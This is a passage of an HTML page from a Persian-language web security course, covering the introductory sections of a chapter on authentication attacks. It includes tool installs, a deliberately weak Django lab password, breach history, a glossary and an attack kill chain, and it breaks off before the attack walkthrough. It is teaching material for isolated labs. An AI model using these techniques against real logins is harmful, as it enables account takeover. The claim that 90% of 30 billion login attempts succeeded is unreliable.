@@ -1,0 +1,1934 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فصل ۵: حمله به احراز هویت (Authentication Attacks) | دوره تخصصی امنیت وب</title>
+    <meta name="description" content="آموزش کامل حملات احراز هویت: Brute Force، Credential Stuffing، Session Hijacking، MFA Bypass، JWT Attacks، Password Reset Flaws — با Hydra، Burp، Medusa و Django.">
+    <meta name="author" content="دوره تخصصی امنیت وب">
+    <meta name="keywords" content="Authentication Attacks, Brute Force, Hydra, Medusa, Credential Stuffing, Session Hijacking, MFA Bypass, JWT, Password Reset">
+    <link rel="stylesheet" href="../../assets/css/style.css">
+    <style>
+        #reading-bar {
+            position: fixed; top: 0; right: 0; left: 0; height: 4px;
+            background: linear-gradient(90deg, #00d97e, #22ffa0);
+            width: 0; z-index: 999; transition: width .1s linear;
+        }
+        .chapter-hero {
+            background: linear-gradient(135deg, #0f172a, #064e3b);
+            color: white; border-radius: 18px; padding: 34px 28px; margin: 26px 0;
+            border: 1px solid #00d97e;
+            position: relative; overflow: hidden;
+        }
+        .chapter-hero::after {
+            content: ''; position: absolute; left: -80px; top: -80px;
+            width: 240px; height: 240px;
+            background: radial-gradient(circle, rgba(0,217,126,.25), transparent 70%);
+        }
+        .chapter-hero h1 { margin: 6px 0 8px; font-size: clamp(1.5rem, 3vw, 2.2rem); position: relative; z-index: 1; }
+        .chapter-hero .chap-num {
+            display: inline-block; background: rgba(0,217,126,.15);
+            border: 1px solid #00d97e; color: #7ee787; padding: 3px 14px;
+            border-radius: 30px; font-size: .85rem; font-weight: 700;
+            position: relative; z-index: 1;
+        }
+        .chapter-hero p.sub { margin: 8px 0 0; opacity: .9; max-width: 820px; position: relative; z-index: 1; }
+        .meta-chips { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; position: relative; z-index: 1; }
+        .meta-chips span {
+            background: rgba(255,255,255,.08); border: 1px solid rgba(255,255,255,.16);
+            border-radius: 30px; padding: 4px 14px; font-size: .8rem;
+            display: inline-flex; gap: 6px; align-items: center;
+        }
+        .chapter-layout {
+            display: grid; grid-template-columns: 280px 1fr; gap: 26px;
+            align-items: start; margin: 26px 0;
+        }
+        .toc-box {
+            position: sticky; top: 70px; background: var(--surface);
+            border: 1px solid var(--line); border-radius: var(--radius); overflow: hidden;
+        }
+        .toc-title {
+            background: #0f172a; color: #7ee787; padding: 10px 16px;
+            font-weight: 800; font-size: .95rem;
+        }
+        .toc-list {
+            list-style: none; margin: 0; padding: 8px;
+            max-height: 60vh; overflow-y: auto;
+        }
+        .toc-list a {
+            display: block; color: var(--muted); font-size: .82rem;
+            padding: 7px 10px; border-radius: 8px;
+            border-right: 3px solid transparent; text-decoration: none;
+            transition: .2s;
+        }
+        .toc-list a:hover { background: var(--surface-2); color: var(--ink); }
+        .toc-list a.active {
+            background: rgba(0,217,126,.1); color: var(--accent);
+            border-right-color: var(--accent); font-weight: 700;
+        }
+        .toc-actions {
+            display: flex; flex-direction: column; gap: 6px;
+            padding: 8px; border-top: 1px dashed var(--line);
+        }
+        .toc-actions button {
+            background: transparent; color: var(--muted);
+            border: 1px solid var(--line); border-radius: 8px;
+            padding: 6px 10px; font-size: .78rem; cursor: pointer;
+            font-family: inherit; transition: .2s;
+        }
+        .toc-actions button:hover { border-color: var(--accent); color: var(--accent); }
+        .pager {
+            display: grid; grid-template-columns: 1fr auto 1fr;
+            gap: 12px; margin: 30px 0;
+        }
+        .pager a {
+            background: var(--surface); border: 1px solid var(--line);
+            border-radius: 12px; padding: 14px 20px; color: var(--text);
+            text-decoration: none; font-weight: 700; transition: .2s;
+            text-align: center;
+        }
+        .pager a:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-2px); }
+        .done-bar {
+            background: rgba(0,217,126,.08);
+            border: 1px dashed #00d97e; border-radius: 12px;
+            padding: 14px; margin: 22px 0; text-align: center;
+        }
+        #mark-done {
+            background: var(--accent); color: #0b1220;
+            border: none; border-radius: 30px;
+            padding: 10px 28px; font-weight: 800; cursor: pointer;
+            font-family: inherit; margin-top: 8px;
+        }
+        #mark-done.done { background: #059669; color: white; }
+        .kpi-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px; margin: 16px 0;
+        }
+        .kpi {
+            background: var(--surface-2); border: 1px solid var(--line);
+            border-radius: 10px; padding: 14px; text-align: center;
+        }
+        .kpi .num { font-size: 1.8rem; font-weight: 800; color: var(--accent); display: block; }
+        .kpi .lbl { font-size: .82rem; color: var(--muted); }
+        .tool-card {
+            background: var(--surface-2); border: 1px solid var(--line);
+            border-radius: 12px; padding: 16px; margin: 12px 0;
+            border-right: 4px solid var(--accent);
+        }
+        .tool-card h6 { color: var(--accent); margin: 0 0 6px; font-size: 1.05rem; }
+        .tool-card .use-case { font-size: .82rem; color: var(--muted); margin-bottom: 8px; }
+        .timeline {
+            list-style: none; padding: 0 20px 0 0; margin: 16px 0;
+            border-right: 3px solid var(--accent);
+        }
+        .timeline li { margin: 12px 0; position: relative; padding-right: 12px; }
+        .timeline li::before {
+            content: '●'; color: var(--accent); position: absolute;
+            right: -28px; top: 2px;
+        }
+        .timeline .year { font-weight: 800; color: var(--accent); margin-left: 8px; }
+        .phase-diagram {
+            background: var(--surface-2); border: 1px solid var(--line);
+            border-radius: 10px; padding: 20px; margin: 16px 0;
+            overflow-x: auto;
+        }
+        .phase-diagram pre { background: transparent; border: none; padding: 0; margin: 0; color: var(--text); }
+        .role-cards {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 14px; margin: 16px 0;
+        }
+        .role-card {
+            background: var(--surface-2); border: 1px solid var(--line);
+            border-radius: 12px; padding: 16px;
+        }
+        .role-card h6 { margin: 0 0 6px; color: var(--accent); font-size: 1rem; }
+        .role-card p { margin: 4px 0; font-size: .85rem; }
+        .quiz-question {
+            background: var(--surface-2); border: 1px solid var(--line);
+            border-radius: 10px; padding: 14px 18px; margin: 12px 0;
+        }
+        .quiz-question strong { color: var(--accent); }
+        .checklist li { list-style: none; margin: 8px 0; padding-right: 26px; position: relative; }
+        .checklist li::before {
+            content: '☐'; position: absolute; right: 0; color: var(--accent);
+            font-size: 1.1rem;
+        }
+        .do-dont { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 16px 0; }
+        .do-box, .dont-box { border-radius: 10px; padding: 14px 18px; }
+        .do-box { background: #0d2818; border: 1px solid #16a34a; }
+        .do-box h6 { color: #4ade80; margin: 0 0 8px; }
+        .dont-box { background: #451a1a; border: 1px solid #dc2626; }
+        .dont-box h6 { color: #f87171; margin: 0 0 8px; }
+        .do-box li, .dont-box li { margin: 6px 0; font-size: .9rem; }
+        .step-number {
+            display: inline-block; background: var(--accent); color: #0b1220;
+            border-radius: 50%; width: 26px; height: 26px; line-height: 26px;
+            text-align: center; font-weight: 800; margin-left: 8px;
+        }
+        @media (max-width: 900px) {
+            .chapter-layout { grid-template-columns: 1fr; }
+            .toc-box { position: static; }
+            .do-dont { grid-template-columns: 1fr; }
+        }
+        @media print {
+            .toc-box, .pager, .site-header, .done-bar, .main-nav { display: none !important; }
+            .chapter-layout { grid-template-columns: 1fr; }
+            body { background: #fff; color: #000; }
+        }
+    </style>
+</head>
+<body>
+    <div id="reading-bar"></div>
+
+    <header class="site-header">
+        <div class="container">
+            <h1>🛡️ دوره تخصصی امنیت وب</h1>
+            <p>فصل ۵ از ۲۱ — حمله به احراز هویت</p>
+        </div>
+    </header>
+
+    <nav class="main-nav">
+        <div class="container">
+            <a href="../../index.html">🏠 صفحه اصلی</a>
+            <a href="#part-01">📖 شروع فصل</a>
+            <a href="../chapter-04/index.html" id="prev-link">➜ فصل قبل</a>
+            <a href="../chapter-06/index.html" id="next-link">فصل بعد ➜</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="chapter-hero">
+            <span class="chap-num">فصل ۵ از ۲۱</span>
+            <h1>🔑 حمله به احراز هویت (Authentication Attacks)</h1>
+            <p class="sub">
+                اولین دروازه هر اپلیکیشن — یاد بگیرید چگونه با Brute Force، Credential Stuffing، Session Hijacking،
+                MFA Bypass و JWT Attacks وارد شوید، و در مقابل، چطور دروازه‌ای محکم بسازید.
+            </p>
+            <div class="meta-chips">
+                <span>🎓 سطح: متوسط</span>
+                <span>⏱ ۱۱۰ دقیقه</span>
+                <span>🔑 Hydra</span>
+                <span>🔑 Burp Intruder</span>
+                <span>🔑 JWT</span>
+                <span>🔑 MFA Bypass</span>
+            </div>
+        </div>
+
+        <div class="chapter-layout">
+            <aside class="toc-box">
+                <div class="toc-title">📑 فهرست ۱۴ بخش این فصل</div>
+                <ul class="toc-list">
+                    <li><a href="#part-01">۱. جعبه عنوان و هویت</a></li>
+                    <li><a href="#part-02">۲. پیش‌نیازها و راه‌اندازی محیط</a></li>
+                    <li><a href="#part-03">۳. اهداف یادگیری</a></li>
+                    <li><a href="#part-04">۴. مقدمه: چرا احراز هویت هدف اول است؟</a></li>
+                    <li><a href="#part-05">۵. مفاهیم کلیدی و واژگان</a></li>
+                    <li><a href="#part-06">۶. آموزش گام‌به‌گام حملات</a></li>
+                    <li><a href="#part-07">۷. کارگاه: حمله به لاگین Django</a></li>
+                    <li><a href="#part-08">۸. تحلیل دفاعی و مقابله</a></li>
+                    <li><a href="#part-09">۹. نکات حرفه‌ای و دام‌های رایج</a></li>
+                    <li><a href="#part-10">۱۰. پرسش و پاسخ</a></li>
+                    <li><a href="#part-11">۱۱. جمع‌بندی و نکات طلایی</a></li>
+                    <li><a href="#part-12">۱۲. خودارزیابی و آزمونک</a></li>
+                    <li><a href="#part-13">۱۳. پروژه هفتگی</a></li>
+                    <li><a href="#part-14">۱۴. منابع و گام بعدی</a></li>
+                </ul>
+                <div class="toc-actions">
+                    <button id="btn-open-answers" type="button">🟢 باز کردن همه پاسخ‌ها</button>
+                    <button id="btn-close-answers" type="button">⚪ بستن همه پاسخ‌ها</button>
+                </div>
+            </aside>
+
+            <div class="main-col">
+
+                <!-- بخش ۱ -->
+                <div class="section-part" id="part-01">
+                    <h3>۱. جعبه عنوان و هویت</h3>
+
+                    <p><strong>📖 عنوان کامل فصل:</strong> حمله به احراز هویت (Authentication Attacks) — کالبدشکافی دروازه ورود اپلیکیشن، از حدس رمز تا دور زدن MFA و سرقت نشست.</p>
+
+                    <p><strong>🎓 سطح دشواری:</strong> متوسط. پیش‌نیاز: فصل ۱ تا ۴ کامل + آشنایی با HTTP (هدر، کوکی، وضعیت) + Burp Suite نصب و تنظیم‌شده روی Firefox Kali.</p>
+
+                    <p><strong>⏱ زمان مطالعه:</strong> ۱۰۰ تا ۱۳۰ دقیقه (بدون احتساب اجرای کامل Brute Force که ممکن است ۱-۳ ساعت طول بکشد).</p>
+
+                    <h5>🎯 اهداف کلان این فصل:</h5>
+                    <ol>
+                        <li>درک تفاوت <strong>Authentication</strong> (هویت‌سنجی) از <strong>Authorization</strong> (اختیاردهی) و چرا اولی هدف اول مهاجم است.</li>
+                        <li>اجرای Brute Force و Password Spraying با <strong>Hydra</strong>، <strong>Medusa</strong> و <strong>Burp Intruder</strong>.</li>
+                        <li>شکستن کامل <strong>Session Management</strong> — از کوکی ضعیف تا Session Fixation.</li>
+                        <li>دور زدن <strong>MFA/2FA</strong> با ۶ تکنیک واقعی (بدون نیاز به کد قربانی).</li>
+                        <li>حمله به <strong>JWT</strong> — از None Algorithm تا Key Confusion.</li>
+                        <li>سوءاستفاده از <strong>Password Reset</strong> و <strong>Account Recovery</strong> ضعیف.</li>
+                        <li>پیاده‌سازی دفاع در Django: Rate Limiting، Lockout، JWT امن، Session Hardening.</li>
+                    </ol>
+
+                    <h5>📚 خروجی قابل اندازه‌گیری (پس از این فصل):</h5>
+                    <ul>
+                        <li>موفقیت در Brute Force روی DVWA (با wordlist کوچک) و مستندسازی.</li>
+                        <li>کشف و بهره‌جویی از یک Session Flaw در Django lab.</li>
+                        <li>فهمیدن و نشان دادن ۳ تکنیک دور زدن MFA روی یک اپ ساده.</li>
+                        <li>ساخت نسخه آسیب‌پذیر و نسخه امن Django برای Login + JWT.</li>
+                        <li>گزارش <code>auth-attack-report.md</code> با CVSS و Remediation.</li>
+                    </ul>
+
+                    <div class="callout co-warn">
+                        <strong>⚠️ هشدار قانونی — این فصل خطرناک‌ترین از نظر قانونی است:</strong>
+                        Brute Force و Credential Stuffing روی هر سیستم واقعی (حتی یک لاگین شخصی) بدون <strong>مجوز کتبی</strong>، <strong>جرم کیفری صریح</strong> است و IP شما در لاگ قربانی ثبت می‌شود. طبق <strong>ماده ۱ و ۲ قانون جرایم رایانه‌ای ایران</strong>، حتی <strong>تلاش ناموفق</strong> هم قابل پیگرد قانونی است. تمام تمرین‌های این فصل باید فقط روی <strong>VMهای خودتان</strong> (192.168.56.x) یا <strong>سرویس‌های آموزشی معتبر</strong> مثل DVWA و PortSwigger Labs باشد.
+                    </div>
+                </div>
+
+                <!-- بخش ۲ -->
+                <div class="section-part" id="part-02">
+                    <h3>۲. پیش‌نیازها و راه‌اندازی محیط</h3>
+
+                    <h5>💻 وضعیت لازم آزمایشگاه (ادامه از فصل ۲ و ۳):</h5>
+                    <table class="objectives-table">
+                        <thead><tr><th>مؤلفه</th><th>وضعیت</th></tr></thead>
+                        <tbody>
+                            <tr><td>Kali Linux</td><td>192.168.56.10 فعال، Burp نصب و پیکربندی</td></tr>
+                            <tr><td>Windows + Django</td><td>192.168.56.20 با سرویس لاگین</td></tr>
+                            <tr><td>DVWA</td><td>روی Kali در <code>http://192.168.56.10/dvwa</code></td></tr>
+                            <tr><td>Snapshot</td><td>به نام <code>pre-auth-attacks</code></td></tr>
+                        </tbody>
+                    </table>
+
+                    <h5>🛠 نصب و به‌روزرسانی ابزارها:</h5>
+<pre class="code-box"># ابزارهای اصلی این فصل
+sudo apt update
+sudo apt install -y \
+    hydra \
+    medusa \
+    john \
+    hashcat \
+    seclists \
+    default-mysql-client \
+    postgresql-client
+
+# ابزارهای JWT
+pip3 install --user pyjwt
+sudo apt install -y jwt-tool
+# یا: git clone https://github.com/ticarpi/jwt_tool
+pip3 install --user jwt-tool
+
+# ابزار تست 2FA
+pip3 install --user pyotp
+
+# بررسی نصب
+hydra -h | head -3
+medusa -h
+jwt_tool -h
+
+# Wordlistهای مهم رمز عبور
+ls /usr/share/wordlists/
+ls /usr/share/seclists/Passwords/Common-Credentials/
+</pre>
+
+                    <h5>🔧 Wordlistهای کلیدی برای این فصل:</h5>
+                    <table class="objectives-table">
+                        <thead><tr><th>Wordlist</th><th>مسیر</th><th>کاربرد</th></tr></thead>
+                        <tbody>
+                            <tr><td>rockyou.txt</td><td>/usr/share/wordlists/rockyou.txt</td><td>۱۴ میلیون رمز واقعی (مهم‌ترین)</td></tr>
+                            <tr><td>top-100</td><td>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt</td><td>۱۰۰ رمز پرتکرار — برای Password Spraying</td></tr>
+                            <tr><td>top-1000</td><td>.../10-million-password-list-top-1000.txt</td><td>۱۰۰۰ رمز پرتکرار</td></tr>
+                            <tr><td>usernames</td><td>/usr/share/seclists/Usernames/top-usernames-shortlist.txt</td><td>نام کاربری‌های رایج (admin, root, test...)</td></tr>
+                            <tr><td>django-admin</td><td>—</td><td>مخصوص Django admin (فقط admin, administrator)</td></tr>
+                        </tbody>
+                    </table>
+
+                    <div class="callout co-warn">
+                        <strong>⚠️ نکته مهم:</strong>
+                        اگر <code>rockyou.txt</code> نصب نیست، از <code>/usr/share/wordlists/rockyou.txt.gz</code> با دستور
+                        <code>sudo gunzip -k rockyou.txt.gz</code> خارجش کنید.
+                    </div>
+
+                    <h5>🐍 تنظیم Django Lab برای این فصل:</h5>
+                    <p>در هدف (Windows)، Django را طوری تنظیم کنید که یک صفحه لاگین داشته باشد:</p>
+<pre class="code-box"># در Django settings.py
+INSTALLED_APPS = [
+    &quot;django.contrib.admin&quot;,
+    &quot;django.contrib.auth&quot;,
+    # ...
+]
+
+# برای سادگی از admin خود Django استفاده می‌کنیم
+# یا یک view لاگین ساده در app بسازید:
+</pre>
+
+<pre class="code-box"># در Django admin بسازید:
+python manage.py createsuperuser
+# Username: admin
+# Password: یک رمز ضعیف (مثلاً admin123 یا password) برای تمرین
+
+# تست دسترسی:
+# http://192.168.56.20:8000/admin/login/
+</pre>
+
+                    <div class="callout co-tip">
+                        <strong>💡 نکته:</strong>
+                        Django admin خودکار در مسیر <code>/admin/</code> قرار می‌گیرد و CSRF Token دارد —
+                        هدف عالی‌ای است برای یادگیری Brute Force با CSRF Token Bypass.
+                    </div>
+                </div>
+
+                <!-- بخش ۳ -->
+                <div class="section-part" id="part-03">
+                    <h3>۳. اهداف یادگیری (چه چیزهایی به دست می‌آورید؟)</h3>
+
+                    <table class="objectives-table">
+                        <thead>
+                            <tr><th>حوزه</th><th>هدف مشخص</th><th>معیار سنجش</th><th>وزن</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Brute Force</strong></td>
+                                <td>اجرای Hydra و Burp Intruder روی لاگین</td>
+                                <td>کشف رمز admin lab از یک wordlist کوچک</td>
+                                <td>۲۰٪</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Session Attacks</strong></td>
+                                <td>شناسایی و بهره‌جویی از ضعف نشست</td>
+                                <td>Session Hijacking یا Fixation در DVWA</td>
+                                <td>۲۰٪</td>
+                            </tr>
+                            <tr>
+                                <td><strong>MFA Bypass</strong></td>
+                                <td>۶ تکنیک دور زدن MFA</td>
+                                <td>موفقیت در ۳ تکنیک روی lab</td>
+                                <td>۱۵٪</td>
+                            </tr>
+                            <tr>
+                                <td><strong>JWT</strong></td>
+                                <td>حمله به JWT ضعیف</td>
+                                <td>None Algorithm یا Key Confusion موفق</td>
+                                <td>۲۰٪</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Password Reset</strong></td>
+                                <td>سوءاستفاده از Reset Token ضعیف</td>
+                                <td>بازنشانی رمز قربانی در lab</td>
+                                <td>۱۰٪</td>
+                            </tr>
+                            <tr>
+                                <td><strong>دفاع</strong></td>
+                                <td>پیاده‌سازی Rate Limiting و Hardening</td>
+                                <td>حمله‌ها بعد از فیکس شکست بخورند</td>
+                                <td>۱۵٪</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h5>📌 پیش‌نیازهای فکری این فصل:</h5>
+                    <ul class="checklist">
+                        <li>با Burp Suite می‌توانم درخواست POST را Capture و Replay کنم</li>
+                        <li>تفاوت GET و POST را می‌دانم و HTTP Status Codeها را می‌شناسم</li>
+                        <li>می‌دانم Cookie چیست و Session ID چطور در آن ذخیره می‌شود</li>
+                        <li>Django lab در حال اجراست و صفحه لاگین admin کار می‌کند</li>
+                        <li>Wordlistهای Seclists روی Kali نصب هستند</li>
+                        <li>می‌دانم Brute Force روی هدف غیرمجاز جرم است</li>
+                    </ul>
+                </div>
+
+                <!-- بخش ۴ -->
+                <div class="section-part" id="part-04">
+                    <h3>۴. مقدمه: چرا احراز هویت هدف اول است؟</h3>
+
+                    <div class="story-box">
+                        <p>📖 <strong>داستان واقعی — نقض Collection #1 (۲۰۱۹):</strong></p>
+                        <p>در ژانویه ۲۰۱۹، محقق امنیتی Troy Hunt مجموعه‌ای عظیم از <strong>۷۷۳ میلیون ایمیل و ۲۱ میلیون رمز عبور</strong> را کشف کرد که در فضای اینترنت آزادانه قابل دانلود بود. این مجموعه حاصل ترکیب چندین نقض داده از سال‌های گذشته بود (Dropbox، LinkedIn، MySpace و...).</p>
+                        <p style="margin-top: 10px;">نتیجه فوری: موج عظیمی از <strong>Credential Stuffing</strong> روی همه سرویس‌های بزرگ دنیا. چون کاربران رمز یکسان روی چند سرویس داشتند، مهاجم فقط نیاز داشت یک دیتابیس قدیمی را بخرد و روی هر سرویسی تست کند.</p>
+                        <p style="margin-top: 10px;">فقط در آمریکا، در سال ۲۰۱۹، بیش از <strong>۳۰ میلیارد</strong> تلاش ورود غیرمجاز ثبت شد — و ۹۰٪ آن‌ها موفق شدند فقط به‌خاطر استفاده مجدد از رمز.</p>
+                    </div>
+
+                    <h5>📊 چرا Authentication هدف شماره ۱ است؟</h5>
+                    <div class="kpi-grid">
+                        <div class="kpi">
+                            <span class="num">۸۱٪</span>
+                            <span class="lbl">نقض‌های داده با رمز ضعیف/دزدیده‌شده (Verizon DBIR)</span>
+                        </div>
+                        <div class="kpi">
+                            <span class="num">۳۰B</span>
+                            <span class="lbl">تلاش ورود غیرمجاز در ۲۰۱۹ (فقط آمریکا)</span>
+                        </div>
+                        <div class="kpi">
+                            <span class="num">۶۵٪</span>
+                            <span class="lbl">کاربران رمز یکسان در چند سرویس دارند</span>
+                        </div>
+                        <div class="kpi">
+                            <span class="num">۱۴M</span>
+                            <span class="lbl">رمز واقعی در rockyou.txt</span>
+                        </div>
+                        <div class="kpi">
+                            <span class="num">۴.۴M$</span>
+                            <span class="lbl">میانگین خسارت نقض با رمز ضعیف (IBM)</span>
+                        </div>
+                    </div>
+
+                    <h5>🎯 چرا احراز هویت، اولین دروازه است؟</h5>
+                    <div class="role-cards">
+                        <div class="role-card">
+                            <h6>🚪 دروازه ورود</h6>
+                            <p>هر چیز دیگری در اپلیکیشن <strong>پشت این دروازه</strong> است. اگر باز شود، همه چیز باز است: داده، پنل مدیریت، فایل‌ها، APIها.</p>
+                        </div>
+                        <div class="role-card">
+                            <h6>🎯 هدف آسان</h6>
+                            <p>نیازی به کشف آسیب‌پذیری پیچیده نیست. یک فرم لاگین با رمز ضعیف کافی است. مقدار موفقیت/تلاش بسیار بالا.</p>
+                        </div>
+                        <div class="role-card">
+                            <h6>💰 ارزش مالی بالا</h6>
+                            <p>هر حساب کاربری = یک دارایی. در Dark Web، حساب‌های Gmail، بانک و سرویس‌های پرداخت به‌صورت مستقیم خرید و فروش می‌شوند.</p>
+                        </div>
+                        <div class="role-card">
+                            <h6>🕵️ مخفی‌کاری</h6>
+                            <p>حمله به لاگین را می‌توان طوری اجرا کرد که هیچ رخدادی در لاگ نباشد (اگر Rate Limit ضعیف باشد). این حمله پنهان‌ترین نوع نفوذ است.</p>
+                        </div>
+                    </div>
+
+                    <h5>📜 تاریخچه کوتاه — چطور رمز عبور به اینجا رسید؟</h5>
+                    <ul class="timeline">
+                        <li><span class="year">۱۹۶۱</span> — اولین رمز عبور در MIT روی سیستم CTSS استفاده شد (برای sharing زمان CPU).</li>
+                        <li><span class="year">۱۹۷۸</span> — اولین الگوریتم هش رمز (crypt) در UNIX.</li>
+                        <li><span class="year">۱۹۹۵</span> — اولین حمله Brute Force سیستماتیک روی FTPها.</li>
+                        <li><span class="year">۲۰۰۹</span> — RockYou Hack — ۳۲ میلیون رمز به‌صورت plaintext لو رفت (پایه rockyou.txt).</li>
+                        <li><span class="year">۲۰۱۲</span> — LinkedIn Breach — ۶.۵ میلیون هش SHA1 بدون salt.</li>
+                        <li><span class="year">۲۰۱۷</span> — Yahoo اعلام کرد <strong>همه ۳ میلیارد حساب</strong> در ۲۰۱۳ نفوذ شده بودند.</li>
+                        <li><span class="year">۲۰۱۹</span> — Collection #1 — ۷۷۳ میلیون ایمیل/۲۱ میلیون رمز در یک پکیج عمومی.</li>
+                        <li><span class="year">۲۰۲۰+</span> — عصر Passkeys و FIDO2 برای حذف رمز عبور.</li>
+                    </ul>
+                </div>
+
+                <!-- بخش ۵ -->
+                <div class="section-part" id="part-05">
+                    <h3>۵. مفاهیم کلیدی و واژگان تخصصی</h3>
+
+                    <h5>5.1 — Authentication در برابر Authorization (تفاوت حیاتی):</h5>
+                    <div class="phase-diagram">
+<pre>┌─────────────────────────────────────────────────────────────┐
+│              Authentication vs Authorization                 │
+│                                                              │
+│   ┌─────────────────────┐       ┌─────────────────────┐    │
+│   │  Authentication      │       │  Authorization       │    │
+│   │  (هویت‌سنجی)          │       │  (اختیاردهی)         │    │
+│   │                      │       │                      │    │
+│   │  سوال: «تو کی هستی؟» │       │  سوال: «چه می‌توانی   │    │
+│   │                      │       │        بکنی؟»         │    │
+│   │  ابزار:               │       │  ابزار:               │    │
+│   │  - رمز عبور           │       │  - نقش‌ها (Roles)      │    │
+│   │  - MFA               │       │  - مجوزها (Permissions)│    │
+│   │  - JWT / Session     │       │  - ACLs              │    │
+│   └──────────┬──────────┘       └──────────┬──────────┘    │
+│              │                              │              │
+│              ▼                              ▼              │
+│         [این فصل]                  [فصل ۹ — IDOR]         │
+│                                                              │
+│   نکته: حمله به Auth اول می‌آید — بعد از عبور از این دروازه │
+│         مهاجم به مرحله Authorization می‌رسد.                │
+└─────────────────────────────────────────────────────────────┘
+</pre>
+                    </div>
+
+                    <h5>5.2 — انواع حملات احراز هویت (دسته‌بندی کامل):</h5>
+                    <table class="objectives-table">
+                        <thead>
+                            <tr><th>#</th><th>حمله</th><th>هدف</th><th>ابزار</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>۱</td><td><strong>Brute Force</strong></td><td>حدس رمز یک کاربر با هزاران ترکیب</td><td>Hydra, Burp Intruder</td></tr>
+                            <tr><td>۲</td><td><strong>Password Spraying</strong></td><td>یک رمز رایج روی هزاران کاربر</td><td>Spray, Burp Intruder</td></tr>
+                            <tr><td>۳</td><td><strong>Credential Stuffing</strong></td><td>استفاده از رمزهای لو رفته</td><td>OpenBullet, Sentry MBA</td></tr>
+                            <tr><td>۴</td><td><strong>Session Hijacking</strong></td><td>دزدیدن Session Cookie</td><td>XSS, MITM, Wireshark</td></tr>
+                            <tr><td>۵</td><td><strong>Session Fixation</strong></td><td>تثبیت Session قربانی</td><td>Burp, سفارشی</td></tr>
+                            <tr><td>۶</td><td><strong>JWT Attacks</strong></td><td>دستکاری Token احراز هویت</td><td>jwt_tool, Burp</td></tr>
+                            <tr><td>۷</td><td><strong>MFA Bypass</strong></td><td>دور زدن کد دوم (OTP)</td><td>۶ تکنیک در بخش ۶</td></tr>
+                            <tr><td>۸</td><td><strong>Password Reset Flaws</strong></td><td>سوءاستفاده از بازنشانی رمز</td><td>Burp, تحلیل دستی</td></tr>
+                            <tr><td>۹</td><td><strong>Account Enumeration</strong></td><td>کشف نام‌های کاربری معتبر</td><td>Burp Intruder + Timing</td></tr>
+                            <tr><td>۱۰</td><td><strong>OAuth Misconfiguration</strong></td><td>سوءاستفاده از Login با Google/GitHub</td><td>Burp, تحلیل دستی</td></tr>
+                        </tbody>
+                    </table>
+
+                    <h5>5.3 — واژه‌نامه تخصصی این فصل:</h5>
+                    <table class="objectives-table">
+                        <thead>
+                            <tr><th>واژه</th><th>معنی</th><th>کاربرد</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>Brute Force</td><td>حدس زدن رمز با همه ترکیب‌های ممکن</td><td>حمله کلاسیک</td></tr>
+                            <tr><td>Dictionary Attack</td><td>استفاده از wordlist به‌جای همه ترکیب‌ها</td><td>نسخه بهینه Brute Force</td></tr>
+                            <tr><td>Password Spraying</td><td>یک رمز، هزاران کاربر</td><td>دور زدن Lockout</td></tr>
+                            <tr><td>Credential Stuffing</td><td>استفاده از رمزهای لو رفته</td><td>حمله اتوماتیک</td></tr>
+                            <tr><td>Username Enumeration</td><td>کشف نام‌های کاربری معتبر</td><td>مرحله اول</td></tr>
+                            <tr><td>Session ID</td><td>شناسه یکتای کاربر بعد از لاگین</td><td>هدف سرقت</td></tr>
+                            <tr><td>Session Fixation</td><td>تحمیل Session ID به قربانی</td><td>حمله پیشرفته</td></tr>
+                            <tr><td>Cookie Flags</td><td>ویژگی‌های امنیتی کوکی</td><td>HttpOnly, Secure, SameSite</td></tr>
+                            <tr><td>HttpOnly</td><td>کوکی از JavaScript مخفی</td><td>دفاع از XSS</td></tr>
+                            <tr><td>SameSite</td><td>کنترل ارسال کوکی در درخواست cross-site</td><td>دفاع از CSRF</td></tr>
+                            <tr><td>JWT</td><td>JSON Web Token</td><td>احراز هویت Stateless</td></tr>
+                            <tr><td>alg=none</td><td>الگوریتم امضای JWT خاموش</td><td>حمله معروف</td></tr>
+                            <tr><td>HS256 vs RS256</td><td>الگوریتم‌های متقارن/نامتقارن</td><td>Key Confusion</td></tr>
+                            <tr><td>TOTP</td><td>Time-based One-Time Password</td><td>MFA استاندارد</td></tr>
+                            <tr><td>MFA Fatigue</td><td>حمله با اسپم کردن درخواست MFA</td><td>تکنیک دور زدن</td></tr>
+                            <tr><td>Recovery Code</td><td>کد بازیابی حساب</td><td>هدف ضعیف</td></tr>
+                            <tr><td>Rate Limiting</td><td>محدودسازی تعداد درخواست</td><td>دفاع کلیدی</td></tr>
+                            <tr><td>Account Lockout</td><td>قفل حساب بعد از تلاش‌های ناموفق</td><td>دفاع دو لبه</td></tr>
+                        </tbody>
+                    </table>
+
+                    <h5>5.4 — چرخه کامل حمله به احراز هویت:</h5>
+                    <div class="phase-diagram">
+<pre>┌──────────────────────────────────────────────────────────────┐
+│         Authentication Attack Kill Chain                     │
+│                                                              │
+│  1. Recon           →  کشف صفحه لاگین، فرم reset، صفحه ثبت‌نام│
+│         ↓                                                    │
+│  2. Enumeration     →  کشف نام‌های کاربری معتبر               │
+│         ↓                                                    │
+│  3. Attack          →  Brute Force / Spraying / Stuffing     │
+│         ↓                                                    │
+│  4. Bypass Defenses →  دور زدن Lockout / Rate Limit / CSRF   │
+│         ↓                                                    │
+│  5. Login Success   →  دسترسی اولیه                          │
+│         ↓                                                    │
+│  6. Session Steal   →  ماندگاری حتی بعد از تغییر رمز          │
+│         ↓                                                    │
+│  7. Privilege Esc   →  از کاربر به ادمین (فصل ۹)             │
+└──────────────────────────────────────────────────────────────┘
+</pre>
+                    </div>
+                </div>
+
+                <!-- بخش ۶ -->
